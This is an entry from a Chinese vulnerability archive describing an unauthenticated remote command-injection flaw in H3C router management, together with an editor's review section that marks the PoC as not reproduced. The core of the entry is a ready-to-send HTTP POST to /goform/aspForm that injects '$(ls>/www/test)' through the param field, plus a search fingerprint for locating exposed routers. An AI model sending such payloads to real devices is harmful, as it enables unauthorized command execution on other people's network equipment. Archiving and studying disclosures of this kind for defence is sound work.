---
source: "wy876 漏洞文库"
id: "vw-c044de4e440c969d8d926e9f"
entity_id: "ve-c044de4e440c969d8d926e9f"
schema_version: "1"
fofa_unverified: "app.name="
title: "H3C多系列路由器存在前台远程命令执行漏洞"
product: "H3C Router Management未确定型号"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "前台声明无版本；写/www/test"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3C%E5%A4%9A%E7%B3%BB%E5%88%97%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/tp0a94dpgkk64aqo"
source_status: "recorded"
---

# H3C多系列路由器存在前台远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C Router Management未确定型号
- 本文讨论：goform/aspForm DelL2tpLNSList param命令注入
- 版本、权限与配置前提：前台声明无版本；写/www/test
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 泛称多系列无型号版本依据；Content-Length76与样例不符
- 无结果/鉴权证据；hunter误存fofa残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证和shell解析/补丁待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
 H3C多系列路由器存在前台远程命令执行漏洞。

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ hunter`app.name="H3C Router Management"`
+ 登录页面


# 四、漏洞复现
```http
POST /goform/aspForm HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Host: 

CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
```


```java
/test
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tp0a94dpgkk64aqo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
